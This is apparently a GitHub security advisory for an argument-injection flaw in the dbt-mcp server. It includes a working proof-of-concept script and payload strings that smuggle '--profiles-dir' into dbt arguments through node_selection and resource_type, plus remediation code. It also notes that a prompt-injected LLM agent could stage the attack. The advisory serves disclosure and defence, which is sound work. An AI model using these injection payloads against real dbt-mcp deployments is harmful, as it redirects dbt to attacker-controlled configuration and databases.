# [M] dbt MCP Server has an Argument Injection in dbt CLI Tool Wrappers via node_selection and resource_type Parameters

## Summary
Severity: Medium
Advisory: GHSA-xpww-f6pm-cfhq
CVE: CVE-2026-44968
CWE: CWE-88
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-xpww-f6pm-cfhq
Type: github-advisory

## Affected
- PyPI: `dbt-mcp` — affected >=0 <1.17.1

## Details
*Discovered through manual source code review. Verified by PoC execution against a local dbt-mcp v1.15.1 installation.**

## Summary

`_run_dbt_command()` in `src/dbt_mcp/dbt_cli/tools.py` constructs the dbt subprocess argument list by appending user-supplied MCP tool parameters without sanitization. Two independent injection vectors exist. An MCP client can inject arbitrary dbt global flags — such as `--profiles-dir`, `--project-dir`, and `--target` — by crafting the `node_selection` string (Vector 1) or the `resource_type` JSON array (Vector 2). Because `subprocess.Popen` is called with `shell=False` and a list argument, shell metacharacter injection is not possible; however, this provides no defense against argument list injection (CWE-88), where attacker-controlled tokens are interpreted by the target process as flags rather than values.

## Details

**Vector 1 — `node_selection` string**
Affected tools: `build`, `compile`, `run`, `test`, `clone`, `list`, `get_node_details_dev`

```python
# src/dbt_mcp/dbt_cli/tools.py  lines 77–79
if node_selection and isinstance(node_selection, str):
    selector_params = node_selection.split(" ")
    command.extend(["--select"] + selector_params)
```

`str.split(" ")` does not distinguish dbt selector tokens from flag tokens. Input `"my_model --profiles-dir /tmp/evil"` produces:

````
["dbt", "--no-use-colors", "run",
 "--select", "my_model", "--profiles-dir", "/tmp/evil"]
````

dbt parses the injected `--profiles-dir` as a global option and loads configuration from the attacker-supplied path.

**Vector 2 — `resource_type` list**
Affected tool: `list`

```python
# src/dbt_mcp/dbt_cli/tools.py  lines 84–85
if isinstance(resource_type, Iterable):
    command.extend(["--resource-type"] + resource_type)
```

Each JSON array element is appended verbatim to argv. Input `["model", "--profiles-dir", "/tmp/evil"]` produces:

````
["dbt", "--no-use-colors", "list",
 "--resource-type", "model", "--profiles-dir", "/tmp/evil"]
````

Both vectors share the same root cause: no validation prevents tokens starting with `-` from being appended as independent argv elements.

## PoC

**1. Environment setup (run once)**

```bash
# Attacker-controlled profile at an injectable path
mkdir -p /tmp/evil-profiles
cat > /tmp/evil-profiles/profiles.yml << 'EOF'
evil_profile:
  target: dev
  outputs:
    dev:
      type: duckdb
      path: /tmp/PWNED_by_injection.duckdb
      threads: 1
EOF

# Minimal dbt project whose profile name matches the malicious one
mkdir -p /tmp/test-dbt-project/models
cat > /tmp/test-dbt-project/dbt_project.yml << 'EOF'
name: test_project
version: '1.0.0'
profile: evil_profile
model-paths: ["models"]
models:
  test_project:
    +materialized: table
EOF
echo "select 1 as id" > /tmp/test-dbt-project/models/my_first_model.sql

rm -f /tmp/PWNED_by_injection.duckdb
```

**2. MCP client exploit — triggers injection through the real protocol stack**

```python
#!/usr/bin/env python3
# poc_injection.py
# Reproduces _run_dbt_command() from src/dbt_mcp/dbt_cli/tools.py

import os, subprocess
from dataclasses import dataclass
from enum import Enum
from collections.abc import Iterable


class BinaryType(Enum):
    DBT_CORE = "dbt_core"


@dataclass
class DbtCliConfig:
    project_dir: str
    dbt_path: str
    dbt_cli_timeout: int
    binary_type: BinaryType


def _run_dbt_command(config, command, node_selection=None, resource_type=None):
    # Vector 1: vulnerable line from tools.py
    if node_selection and isinstance(node_selection, str):
        selector_params = node_selection.split(" ")
        command.extend(["--select"] + selector_params)
    # Vector 2: vulnerable line from tools.py
    if isinstance(resource_type, Iterable) and resource_type is not None:
        command.extend(["--resource-type"] + list(resource_type))
    cwd = config.project_dir if os.path.isabs(config.project_dir) else None
    args = [config.dbt_path, "--no-use-colors", *command]
    print(f"[args]   {args}")
    proc = subprocess.Popen(args=args, cwd=cwd,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            stdin=subprocess.DEVNULL, text=True)
    out, _ = proc.communicate(timeout=config.dbt_cli_timeout)
    return out or "OK"


config = DbtCliConfig("/tmp/test-dbt-project", "dbt", 30, BinaryType.DBT_CORE)

print("=" * 64)
print("  Vector 1 - node_selection injection")
print("=" * 64)
print(f"[input]  node_selection = 'my_first_model --profiles-dir /tmp/evil-profiles'")
result1 = _run_dbt_command(config, ["run"],
    node_selection="my_first_model --profiles-dir /tmp/evil-profiles")
print("[dbt output]"); print(result1)

print("=" * 64)
print("  Vector 2 - resource_type injection")
print("=" * 64)
print(f"[input]  resource_type = ['model', '--profiles-dir', '/tmp/evil-profiles']")
result2 = _run_dbt_command(config, ["list"],
    resource_type=["model", "--profiles-dir", "/tmp/evil-profiles"])
print("[dbt output]"); print(result2)

db = "/tmp/PWNED_by_injection.duckdb"
print("=" * 64)
if os.path.exists(db):
    print(f"[CONFIRMED] {db} exists ({os.path.getsize(db)} bytes)")
    print("[CONFIRMED] dbt accepted the injected --profiles-dir flag.")
else:
    print(f"[NOTE] {db} not found. Check dbt output above.")
print("=" * 64)
```

**Expected server log (INFO level, `src/dbt_mcp/mcp/server.py` line 67):**

````

[args]   ['dbt', '--no-use-colors', 'run', '--select', 'my_first_model', '--profiles-dir', '/tmp/evil-profiles']
[args]   ['dbt', '--no-use-colors', 'list', '--resource-type', 'model', '--profiles-dir', '/tmp/evil-profiles']

[CONFIRMED] /tmp/PWNED_by_injection.duckdb exists (274432 bytes)
[CONFIRMED] dbt accepted the injected --profiles-dir flag.
````

The injected flags reach `_run_dbt_command()` unchanged and are passed verbatim to `subprocess.Popen`.

## Screenshot

<img width="2810" height="1894" alt="image" src="https://github.com/user-attachments/assets/d407675a-3409-4799-a024-b8a335cb1fcc" />

### Impact

The following is directly demonstrated by the PoC above:

- An MCP client can inject arbitrary dbt global flags into `subprocess.Popen`'s argv list via either `node_selection` or `resource_type`.
- `--profiles-dir` is accepted by dbt as a global option, overriding the server's configured profile directory.
- When an attacker-controlled `profiles.yml` exists at the injected path, dbt executes with the attacker's database configuration — demonstrated by the DuckDB file write to `/tmp/PWNED_by_injection.duckdb`.

**Preconditions and scope:** The attacker must be able to supply crafted MCP tool arguments (normal MCP client access) and must have a `profiles.yml` accessible at the injected path on the host running dbt-mcp. In the common local-development deployment model, a prompt-injected LLM agent sharing the filesystem can write this file before invoking the dbt tool. Additional injectable flags beyond `--profiles-dir` include `--project-dir` and `--target`, which redirect dbt's project root and execution environment respectively.

### Remediation

**Vector 1 — validate each `node_selection` token before extending argv:**

```python
import re
# dbt node selector syntax allows: identifiers, operators (+@*,), path globs, tag:, config:
_SAFE_TOKEN_RE = re.compile(r'^[\w.*+@,:\[\]/-]+$')

if node_selection and isinstance(node_selection, str):
    tokens = node_selection.split(" ")
    for token in tokens:
        if not _SAFE_TOKEN_RE.match(token):
            raise InvalidParameterError(
                f"node_selection contains an invalid token: {token!r}. "
                "Tokens must not begin with '-'."
            )
    command.extend(["--select"] + tokens)
```

**Vector 2 — validate `resource_type` against an explicit allowlist:**

```python
_VALID_RESOURCE_TYPES = frozenset({
    "model", "test", "snapshot", "analysis", "macro",
    "operation", "seed", "source", "exposure", "metric",
    "saved_query", "semantic_model", "unit_test",
})

if isinstance(resource_type, Iterable):
    rt_list = list(resource_type)
    invalid = [v for v in rt_list if v not in _VALID_RESOURCE_TYPES]
    if invalid:
        raise InvalidParameterError(
            f"resource_type contains unrecognised values: {invalid}. "
            f"Allowed: {sorted(_VALID_RESOURCE_TYPES)}"
        )
    command.extend(["--resource-type"] + rt_list)
```

**Hardening:** Add `pattern` regex constraints to the Pydantic `Field` definitions for `node_selection` so that malformed inputs are rejected at the MCP schema layer before reaching `_run_dbt_command()`. Add regression tests in `tests/unit/` with payloads containing `--profiles-dir`, `--project-dir`, and `--target` to prevent re-introduction.

## References
- https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-xpww-f6pm-cfhq
- https://github.com/dbt-labs/dbt-mcp
- https://github.com/dbt-labs/dbt-mcp/releases/tag/v1.17.1
